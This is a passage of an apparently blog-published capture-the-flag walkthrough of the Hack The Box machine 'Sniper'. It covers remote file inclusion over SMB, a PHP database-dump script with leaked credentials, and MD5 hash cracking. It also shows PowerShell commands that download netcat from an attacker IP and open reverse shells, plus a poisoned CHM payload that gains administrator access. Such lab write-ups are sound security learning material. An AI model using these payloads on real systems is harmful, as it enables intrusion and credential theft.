+&lt;p&gt;&lt;code&gt;http://10.10.10.151/blog/?lang=\\\10.10.14.34\share\hax.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This returns the HTML elements of the script, when we view the source; to use it, we append &lt;code&gt;&amp;amp;cmd=some+command+here&lt;/code&gt; to the url (make sure to change the request type to POST as well).&lt;/p&gt;
+&lt;p&gt;From there, we can run commands, e.g:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://10.10.10.151/blog/?lang=\\\10.10.14.34\share\hax.php&amp;amp;cmd=dir ..\user\&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;To view the contents of the /user directory (from our initial dirb scans). This shows us some cool stuff:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;10/01/2019  08:44 AM    &amp;lt;DIR&amp;gt;          .
+10/01/2019  08:44 AM    &amp;lt;DIR&amp;gt;          ..
+04/11/2019  05:15 PM               108 auth.php
+04/11/2019  05:52 AM    &amp;lt;DIR&amp;gt;          css
+04/11/2019  10:51 AM               337 db.php
+04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          fonts
+04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          images
+04/11/2019  06:18 AM             4,639 index.php
+04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          js
+04/11/2019  06:10 AM             6,463 login.php
+04/08/2019  11:04 PM               148 logout.php
+10/01/2019  08:42 AM             7,192 registration.php
+08/14/2019  10:35 PM             7,004 registration_old123123123847.php
+04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          vendor
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the old registration file above, it shows us how the form actually inserts values from the registration form into the DB&amp;ndash; specifically it tells us the table that data gets inserted into. On top of that, the db.php file contains a full connection statement, including creds, that we can use to basically query the contents of the users table using our RFI method. After a bit of fiddling, effectively I created a new file in the SMB share (mysql.php) with the following code:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$con = mysqli_connect(&amp;quot;localhost&amp;quot;,&amp;quot;dbuser&amp;quot;,&amp;quot;36mEAhz/B8xQ~2VM&amp;quot;,&amp;quot;sniper&amp;quot;);
+$query = &amp;quot;SELECT * from users&amp;quot;;
+$result = mysqli_query($con,$query);
+
+while($output = mysqli_fetch_array($result)) {
+		print_r($output);
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hopefully this is fairly self explanatory; I lifted the $con variable from the server-side copy of db.php, adjusted the query to simply select everything from the users table, and then (the fiddly bit) was getting it to dump the contents. Which I now have :) The two users of interest (for reasons) are my own login info (via the test account I registered with):&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Array
+(
+	[0] =&amp;gt; 12
+	[id] =&amp;gt; 12
+	[1] =&amp;gt; 5ysk3y
+	[username] =&amp;gt; 5ysk3y
+	[2] =&amp;gt; a@b.c
+	[email] =&amp;gt; a@b.c
+	[3] =&amp;gt; 5f4dcc3b5aa765d61d8327deb882cf99
+	[password] =&amp;gt; 5f4dcc3b5aa765d61d8327deb882cf99
+	[4] =&amp;gt; 2019-10-14 01:54:13
+	[trn_date] =&amp;gt; 2019-10-14 01:54:13
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the superuser password hash:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Array
+(
+	[0] =&amp;gt; 1
+	[id] =&amp;gt; 1
+	[1] =&amp;gt; superuser
+	[username] =&amp;gt; superuser
+	[2] =&amp;gt; admin@sniper.co
+	[email] =&amp;gt; admin@sniper.co
+	[3] =&amp;gt; 6e573c8b25e9168e0c61895d821a3d57
+	[password] =&amp;gt; 6e573c8b25e9168e0c61895d821a3d57
+	[4] =&amp;gt; 2019-04-11 22:45:36
+	[trn_date] =&amp;gt; 2019-04-11 22:45:36
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There are more, likely from signups from other HTB users, so I&amp;rsquo;ve dumped them all for reference. I grabbed my own registered password hash to see if I can crack it (since I know what the pass is) before I move onto super user.&lt;/p&gt;
+&lt;p&gt;Also, I have used my wrapper script to enum the users on this box:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;04/09/2019  06:47 AM    &amp;lt;DIR&amp;gt;          Administrator
+04/11/2019  07:04 AM    &amp;lt;DIR&amp;gt;          Chris
+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sadly I cant dir the contents but non the less! I&amp;rsquo;ve also just realised that the old registration form tells us exactly what type of format the DB passwords are stored in, as its inserted in the following manner:&lt;/p&gt;
+&lt;p&gt;.md5($password).&lt;/p&gt;
+&lt;p&gt;So its an MD5 hash. Lets try to crack our own! Hashcat got it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
+5f4dcc3b5aa765d61d8327deb882cf99:password
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sadly the sysadmin password didnt seem to crack quite as easily - SSH isnt available on this server as it&amp;rsquo;s a Windows box, so its likely we will need to priv esc, meaning the sooner we can get a stable shell the better.&lt;/p&gt;
+&lt;p&gt;In order to get a stable shell, I had to supply my own netcat binary to Windows and then use that directly. Specifically:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Upload nc64 (windows netcat, using this specific command):&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;python exploit.py &amp;quot;powershell.exe -nop -exec bypass -c Invoke-WebRequest -Uri http://10.10.14.23:9001/nc64.exe -OutFile C:\\Windows\\temp\\nc64.exe&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;This will serve nc64 and save it in Windows temp dir. We can then call it using the same powershell syntax, ensuring you have netcat listening:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;python exploit.py &amp;quot;powershell.exe -nop -exec bypass -c C:\\Windows\\temp\\nc64.exe 10.10.14.23 9002 -e powershell&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;From there we can use our enumerated data to login as the user account; we know the username is Chris, and some trial and error logins to crackmapexec show we also have a valid password from the databsae file - not many passwords have been found up to now, but attempting to use Chris&#39; username with the MySQL password we found earlier does yield results. Let&amp;rsquo;s setup our credential object so we can privesc:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$user = &amp;quot;SNIPER\Chris&amp;quot;
+$pass = ConvertTo-SecureString &amp;quot;36mEAhz/B8xQ~2VM&amp;quot; -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential($user,$pass)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And then use it to execute code as Chris&#39; user, e.g:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PS C:\inetpub\wwwroot\blog&amp;gt; Invoke-Command -ComputerName SNIPER -ScriptBlock { whoami } -Credential $creds
+sniper\chris
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From there I downloaded another copy of nc64.exe that would be owned by Chris:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Invoke-Command -ComputerName SNIPER -ScriptBlock { Invoke-WebRequest -Uri http://10.10.14.23:9001/nc64.exe -OutFile C:\\Users\\Chris\\Documents\\nc64.exe } -Credential $creds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And then ran that to get a second reverse shell:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Invoke-Command -ComputerName SNIPER -ScriptBlock { C:\Users\Chris\Documents\nc64.exe 10.10.14.23 9002 -e powershell.exe } -Credential $creds&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And the subsquent user flag:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PS C:\Docs&amp;gt; type C:\Users\Chris\Desktop\user.txt
+type C:\Users\Chris\Desktop\user.txt
+21f4d0f29fc4dd867500c1ad716cf56e
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
+&lt;p&gt;Next onto root, some basic enum of the root dir (C:) shows an interesting and unusual “docs” folder..&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;PS C:\Docs&amp;gt; dir
+
+    Directory&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; C:\Docs
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/11/2019   9&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;31 AM            285 note.tx
+-a----        4/11/2019   9&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;17 AM         552607 php &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; dummies-trial.pdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lets have a look at that note:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PS C:\Docs&amp;gt; type note.txt
+
+Hi Chris,
+Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.
+
+Regards,
+Sniper CEO.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So this seems to be hinting at an exploit involving CHM (Compiled Help Files for Windows). I sought to narrow down what CHM files existed on the box:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$dir = Get-ChildItem C:\ -recurse -file -force -ErrorAction SilentlyContinue&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This pulls all visible files from the C:\ drive into a variable (thats a big list..) and we then narrow it down to just CHM files:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$List = $Dir | where {$_.extension -eq &amp;quot;.chm&amp;quot;}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Having glossed over all of them, the most obvious one is the first in the list:&lt;/p&gt;
+&lt;p&gt;$List | format-table name,directory | select -first 10&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Name                                                        Directory
+----                                                        ---------
+instructions.chm                                            C:\Users\Chris\Downloads
+cliconf.chm                                                 C:\Windows\Help\mui\0409
+mmc.CHM                                                     C:\Windows\Help\mui\0409
+msdasc.chm                                                  C:\Windows\Help\mui\0409
+msorcl32.chm                                                C:\Windows\Help\mui\0409
+odbcinst.chm                                                C:\Windows\Help\mui\0409
+odbcjet.chm                                                 C:\Windows\Help\mui\0409
+sqlsodbc.chm                                                C:\Windows\Help\mui\0409
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ve downloaded a copy of this (via SMB) in order to look into it further.&lt;/p&gt;
+&lt;p&gt;In a nutshell this is going to be a poisoned CHM exploit:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7&#34; target=&#34;_blank&#34;&gt;Poison CHM Gist&lt;/a&gt;
+&lt;/p&gt;
+&lt;p&gt;Lets do this manually first. On a Windows machine I decompiled the CHM file we got from Chris using something called &lt;a href=&#34;http://keyworks.helpmvp.com/home/keytools&#34; target=&#34;_blank&#34;&gt;KeyTools&lt;/a&gt;
+ - this allows you to decompile CHM files so their contents can be modified. This isn&amp;rsquo;t necessary but I chose to do it as a learning exercise. Once extracted, I created a copy of the single html file in there, and added the exploit as described in the above link:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;OBJECT id=x classid=&amp;quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&amp;quot; width=1 height=1&amp;gt;
+  &amp;lt;PARAM name=&amp;quot;Command&amp;quot; value=&amp;quot;ShortCut&amp;quot;&amp;gt;
+  &amp;lt;PARAM name=&amp;quot;Button&amp;quot; value=&amp;quot;Bitmap::shortcut&amp;quot;&amp;gt;
+  &amp;lt;PARAM name=&amp;quot;Item1&amp;quot; value=&#39;,cmd.exe,/c C:\Users\Chris\Documents\nc64.exe 10.10.14.23 9003 -e powershell.exe&#39;&amp;gt;
+  &amp;lt;PARAM name=&amp;quot;Item2&amp;quot; value=&amp;quot;273,1,1&amp;quot;&amp;gt;
+&amp;lt;/OBJECT&amp;gt;
+&amp;lt;SCRIPT&amp;gt;
+  x.Click();
+&amp;lt;/SCRIPT&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From there, we can download &lt;a href=&#34;https://www.microsoft.com/en-us/download/details.aspx?id=21138&#34; target=&#34;_blank&#34;&gt;HTML Help Workshop&lt;/a&gt;
+ and recompile the CHM file inclusive of our newly poisoned HTML doc. You can also compile a new project from scratch to do this, completely omitting KeyTools altogether.&lt;/p&gt;
+&lt;p&gt;For me, getting this to actually work was massively hit and miss. A good test before running this is to get the box to ping you via &lt;code&gt;ping -n 2 &amp;lt;IP.ADDRESS&amp;gt;&lt;/code&gt; - changing the value of the Item1 parameter in our XML code above will acheive this.&lt;/p&gt;
+&lt;p&gt;Once confirmed I compiled the CHM with the nc64.exe line and moved it into C:\Docs - with a listener running. After a few attempts we get a call back:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;skynet Boxes/Sniper » nc -nlvp 9003
+Connection from 10.10.10.151:49719
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32&amp;gt; whoami
+sniper\administrator
+
+PS C:\Windows\system32&amp;gt; hostname
+Sniper
+
+PS C:\Windows\system32&amp;gt; type C:\Users\Administrator\Desktop\root.txt
+5624caf363e2750e994f6be0b7436c15
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Result!&lt;/p&gt;
+</content>
     </item>
     
   </channel>
